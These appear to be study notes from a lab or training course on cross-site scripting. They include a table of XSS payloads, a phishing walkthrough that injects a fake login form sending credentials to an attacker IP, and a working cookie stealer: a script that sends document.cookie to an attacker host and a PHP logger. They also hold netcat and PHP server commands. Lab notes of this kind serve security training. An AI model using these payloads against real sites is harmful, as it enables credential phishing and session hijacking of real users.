# Cross-site Scripting (XSS)  

>Burp Suite Certified Practitioner (BSCP) [My Study Notes on XSS](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#cross-site-scripting)  

## Commands  

| Code | Description |
| ----- | ----- |
| **XSS Payloads** |
| `<script>alert(window.origin)</script>` | Basic XSS Payload [XSS Testing Payloads](https://academy.hackthebox.com/module/103/section/967) |
| `<script>alert(document.cookie)</script>` | To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url. |
| `<plaintext>` | Basic XSS Payload |
| `http://94.237.62.82:55501/index.php?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E` | Reflected XSS, which gets processed by the back-end server, and DOM-based XSS, which is completely processed on the client-side and never reaches the back-end server. |
| `document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);` | [Identify DOM-XSS in the JavaScript source of the client browser](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#identify-dom-xss)  
| `<script>print()</script>` | Basic XSS Payload |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS Payload |
| `<img src="" onerror=alert(document.cookie)>` | [DOM Attacks](https://academy.hackthebox.com/module/103/section/974) |
| `<script>document.body.style.background = "#141d2b"</script>` | Change Background Color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change Background Image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change Website Title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite website's main body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove certain HTML element |
| `<script src="http://OUR_IP/script.js"></script>` | Load remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send Cookie details to us |
| **Commands** |
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run `xsstrike` on a url parameter |
| `sudo nc -lvnp 80` | Start `netcat` listener |
| `sudo php -S 0.0.0.0:80 ` | Start `PHP` server, to allow the victim to load remote script from attacker. |


## Identify XSS  

>Simple test payload on target with no protection to identify XSS Reflection: [XSS Discovery](https://academy.hackthebox.com/module/103/section/982)  

```
<script>alert('pass')</script>
```  

![xss-identify](/images/xss-identify.png)  

## Phishing + XSS  

>[Phishing ](https://academy.hackthebox.com/module/103/section/984)  

>Try to find a working XSS payload for the Image URL form found at '/phishing' in the `http://10.129.63.83/phishing/index.php` server.
>Then use what you learned in this section to prepare a malicious URL that injects a malicious login form.
>Then visit '/phishing/send.php' to send the URL to the victim
>The victim user will log into the malicious login form. 
>If you did everything correctly, you should receive the victim's login credentials.
>Use obtained victim login gain access to '/phishing/login.php' and obtain the flag.  

>XSS injection point identified in source code below:  

![xss-source-code-review](/images/xss-source-code-review.png)  

>Below below uses `'>` to break out of te source code img tag.  

```
http://10.129.63.83/phishing/index.php?url=http://10.10.15.41/image.png'><script>alert('xss found')</script>
```  

![xss-phishing-found](/images/xss-phishing-found.png)  

>Login Form Injection phishing attack

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```  

>Use above and make Single JavaScript Cookie Stealer one-liner:

```
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```  

![xss-cleanup](/images/xss-cleanup.png)  

>Removing the target function input box to get victim to login and provide credentials instead.
>From source code the HTML element we need to remove is the `urlform` id.  

```JavaScript
document.getElementById('urlform').remove();
```  

>Combine above remove functions with single oneline payload:  

```JavaScript
<script>
document.write('<h3>Please login to continue</h3><form action=http://10.10.15.41><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
</script>
<!--
```  

![XSS-Phishing-payload-remove-html-id](/images/XSS-Phishing-payload-remove-html-id.PNG)  

>Using Exploit send phishing link url to victim: `http://10.129.63.83/phishing/send.php`.  

>Once the link send the kali hosted `python3 -m http.server 80` service receive the credentials from victim that clicked on the link and typed their info.

![xss-phishing-server](/images/xss-phishing-server.png)  

```
username=admin&password=p1zd0nt57341myp455
```

## Cookie Stealer  

>BSCP Study notes contain many examples of [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#dom-based-xss)  

>[Session Hijacking](https://academy.hackthebox.com/module/103/section/1008) aka Cookie Stealer attacks.  

>Target URL: `http://10.129.63.83/hijacking/`  

![cookie-stealer-register](/images/cookie-stealer-register.png)  

>Target response message read, `An Admin will review your registration request.`.  

>Identify vulnerable input field with sample javascript payload: `<script src="http://OUR_IP/username"></script>`  

### Remote JS File Include  

>Using below payload to test how to escape and [load remote JavaScript file](https://academy.hackthebox.com/module/103/section/1008).

```html
<script src=http://10.10.15.41/1></script>
'><script src=http://10.10.15.41/2></script>
"><script src=http://10.10.15.41/3></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```  

>Successfully Identified the URL field with this payload: `"><script src=http://10.10.15.41/exploit.js></script>`, Loading a Remote Script.  

>A session hijacking attack is similar to the phishing attack, It requires a JavaScript payload to send attacker the required data and a PHP script hosted on attack host to grab and parse the transmitted data.  

### Setup Cookie Stealer  

>Kali hosting PHP server with `php -S 0.0.0.0:80` the following two files: 

>The source code for `exploit.js`:
```javascript
// document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://10.10.15.41/index.php?c='+document.cookie;
```  

The PHP source code for `index.php`:  
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```  

>Burp Suite Send the payload and wait for the Admin user to review our page registration, that contain the stored XSS cookie stealer payload in the `imgurl=` parameter.  

![burp-repeater-send-cookie-stealer-stored-xss](/images/burp-repeater-send-cookie-stealer-stored-xss.png)  

>Execute the attack and wait for PHP exploit service to receive the admin cookie value.

![cookie-stealer-exploit](/images/cookie-stealer-exploit.png)  

>Stolen cookie value received and stored in `cookies.txt` file.  
```
Victim IP: 10.129.34.48 | Cookie: cookie=c00k1355h0u1d8353cu23d
```

>Then use saved cookie value into browser session at `http://victim.htb/login.php` to gain access.  

>[Remediation and prevention secure coding practices](https://academy.hackthebox.com/module/103/section/1009)  

# XSS Skills Assessment  

>[Cross Site Scripting XSS Skills Assessment](https://academy.hackthebox.com/module/103/section/1011)  

>Posting a comment to the assessment blog, there is message, `Your comment is awaiting moderation.`.

![xss assessment await-moderation](/images/xss-assessmennt-await-moderation.png)  

>Reference: [PayloadALlTheThings XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc)  

## Blind XSS Detection  

>A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.  

>Testing payloads to identify Blind XSS - loading a remote script:  

```
<script src=http://10.10.15.41></script>
'><script src=http://10.10.15.41></script>
"><script src=http://10.10.15.41></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.15.41\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.10.15.41");a.send();</script>
<script>$.getScript("http://10.10.15.41")</script>
```  

![xss-blind-injection-identified](/images/xss-blind-injection-identified.png)  

>Successful payload identified as, `'><script src=http://10.10.15.41></script>`  

## Session Hijacking  

>Loading a Remote Exploit JavaScript Script payload. [Session Hijacking](https://academy.hackthebox.com/module/103/section/1008)  

```
'><script src=http://10.10.15.41/exploit.js></script>
```  

>Submitting the blind XSS injection to steal cookie of the admin moderator.  

![xss-blind-post-comment](/images/xss-blind-post-comment.png)  

>Cookie Stealer obtained the value of the 'flag' cookie.  

![xss-assessmennt-admin-cookie-stolen](/images/xss-assessmennt-admin-cookie-stolen.png)  

>Results of the stolen cookie is stored in the file `cat cookies.txt`.  
